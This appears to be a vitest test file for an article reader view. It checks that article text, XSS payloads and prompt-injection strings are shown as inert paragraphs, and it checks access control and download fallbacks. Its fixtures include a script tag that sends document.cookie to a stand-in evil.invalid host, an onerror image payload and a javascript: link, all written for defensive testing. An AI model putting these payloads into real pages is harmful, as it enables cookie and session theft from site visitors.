// READER-A adversarial (docs/specs/reader-a-view.md): article text is data. A script tag and the listing
// injection strings of packages/model/test-data/injection-cases.json come back as plain paragraph
// strings and the page puts them in text nodes; a publisher, an operator or an anonymous caller gets no
// content; an item that is not plain text or Markdown, or is too big, gets the download answer and no
// reader evidence.
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { bootRefundWorld, buy } from './refund-support';
import type { RefundWorld } from './refund-support';
import { MAX_READER_BYTES } from './lib/reader-view';

vi.mock('server-only', () => ({}));

let w: RefundWorld;
beforeAll(async () => {
  w = await bootRefundWorld();
});
afterAll(async () => {
  await w.app.close();
});

const injections = (
  JSON.parse(
    readFileSync(
      new URL('../../../packages/model/test-data/injection-cases.json', import.meta.url),
      'utf8',
    ),
  ) as { listing_injections: { id: string; text: string }[] }
).listing_injections;

/** Replace what an article holds (its bytes, hash and mime) before anyone buys it. */
async function setArticle(key: string, text: string | Uint8Array, mime = 'text/plain') {
  const bytes = typeof text === 'string' ? new TextEncoder().encode(text) : text;
  const sha = createHash('sha256').update(bytes).digest('hex');
  const content_key = `seed/harbour-ledger/${key}.txt`;
  await w.app.db.query(
    'UPDATE content_blobs SET data = $2, sha256 = $3, bytes = $4, mime = $5 WHERE content_key = $1',
    [content_key, bytes, sha, bytes.length, mime],
  );
  // 0012 freezes an article's hash and key while an offer uses it; a test fixture lifts that for one update.
  await w.app.db.query('ALTER TABLE articles DISABLE TRIGGER articles_content_frozen');
  try {
    await w.app.db.query(
      'UPDATE articles SET sha256 = $2, bytes = $3, mime = $4 WHERE content_key = $1',
      [content_key, sha, bytes.length, mime],
    );
  } finally {
    await w.app.db.query('ALTER TABLE articles ENABLE TRIGGER articles_content_frozen');
  }
}

const kinds = async (entitlement_id: string): Promise<string[]> =>
  (
    await w.app.db.query<{ kind: string }>(
      'SELECT kind FROM access_events WHERE entitlement_id = $1 ORDER BY at, id',
      [entitlement_id],
    )
  ).rows.map((r) => r.kind);

describe('article text is shown as text', () => {
  it('a script tag and every listing injection string come back verbatim as paragraphs', async () => {
    const text = [
      'Plain first paragraph.',
      '<script>window.location="https://evil.invalid/?c="+document.cookie</script>',
      '<img src=x onerror=alert(1)>',
      ...injections.map((i) => i.text.replace(/\n+/g, ' ')),
    ].join('\n\n');
    await setArticle('knot-notebook', text);
    const u = await buy(w, { offer: 'knot-notebook', option: 'online_read' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorA });
    if (!v.ok || v.kind !== 'text') throw new Error('expected a text view');
    expect(v.paragraphs).toEqual(text.split('\n\n'));
    expect(v.paragraphs[1]).toContain('<script>');
    // Nothing is rewritten, executed or acted on: the buyer's library and orders are as they were.
    const orders = await w.app.db.query<{ c: string }>(
      'SELECT count(*) AS c FROM orders WHERE buyer_id = $1',
      [(w.actorA as { buyer_id: string }).buyer_id],
    );
    expect(Number(orders.rows[0]!.c)).toBeGreaterThanOrEqual(1);
  });

  it('the page renders each paragraph as a React text node and has no way to inject markup', () => {
    const page = readFileSync(
      new URL('./app/library/[entitlement]/read/page.tsx', import.meta.url),
      'utf8',
    ).replace(/\/\/.*$/gm, '');
    expect(page).not.toMatch(
      /dangerouslySetInnerHTML|innerHTML|marked|markdown-it|remark|DOMPurify/i,
    );
    expect(page).not.toMatch(/from 'react-dom|from 'next\/script|<script/);
    expect(page).toMatch(/<p key=\{[^}]+\}>\{[a-z]+\}<\/p>/);
  });
});

describe('who gets no content', () => {
  it('a publisher, an operator and an anonymous caller get not_found and no event', async () => {
    await setArticle('harbour-fees', 'Fees, in plain text.');
    const u = await buy(w, { offer: 'harbour-fees', option: 'online_read' });
    const before = await kinds(u.entitlement_id);
    for (const actor of [
      { kind: 'publisher', publisher_id: 'pub_harbour' },
      { kind: 'operator', operator_id: 'opr_vikram', mfa: true },
      { kind: 'system' },
    ] as const) {
      const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor });
      expect(v).toEqual({ ok: false, code: 'not_found' });
    }
    expect(await kinds(u.entitlement_id)).toEqual(before);
  });

  it('the other buyer cannot read it either', async () => {
    const u = await buy(w, { offer: 'ferry-timetables', option: 'online_read' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorB });
    expect(v).toEqual({ ok: false, code: 'not_found' });
  });
});

describe('items that do not open in the reader', () => {
  it('a PDF gets the download answer, with the title and window, and no reader evidence', async () => {
    await setArticle(
      'tide-tables',
      new TextEncoder().encode('%PDF-1.4 synthetic'),
      'application/pdf',
    );
    const u = await buy(w, { offer: 'tide-tables', option: 'online_read' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorA });
    expect(v.ok).toBe(true);
    if (!v.ok) return;
    expect(v.kind).toBe('download');
    expect('paragraphs' in v).toBe(false);
    expect(v.title.length).toBeGreaterThan(0);
    expect(v.window.state).toBe('running');
    expect(await kinds(u.entitlement_id)).not.toContain('reader_rendered');
    // F4: a visit that only gets the download answer issues no link.
    expect(await kinds(u.entitlement_id)).not.toContain('link_issued');
  });

  it('text over 200 KB gets the download answer too', async () => {
    await setArticle('ferry-timetables', 'x'.repeat(MAX_READER_BYTES + 1));
    const u = await buy(w, { offer: 'ferry-timetables', option: 'online_read', who: 'B' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorB });
    expect(v.ok && v.kind).toBe('download');
    expect(await kinds(u.entitlement_id)).not.toContain('reader_rendered');
  });

  it('text of exactly 200 KB is still read', async () => {
    await setArticle('knot-notebook', 'y'.repeat(MAX_READER_BYTES));
    const u = await buy(w, { offer: 'knot-notebook', option: 'online_read', who: 'B' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorB });
    expect(v.ok && v.kind).toBe('text');
  });

  it('text/markdown is read as plain paragraphs, with its markup left alone', async () => {
    await setArticle(
      'harbour-fees',
      '# Heading\n\n**bold** [link](javascript:alert(1))',
      'text/markdown',
    );
    const u = await buy(w, { offer: 'harbour-fees', option: 'online_read', who: 'B' });
    const v = await w.app.engine.readerView({ entitlement_id: u.entitlement_id, actor: w.actorB });
    if (!v.ok || v.kind !== 'text') throw new Error('expected a text view');
    expect(v.paragraphs).toEqual(['# Heading', '**bold** [link](javascript:alert(1))']);
  });
});
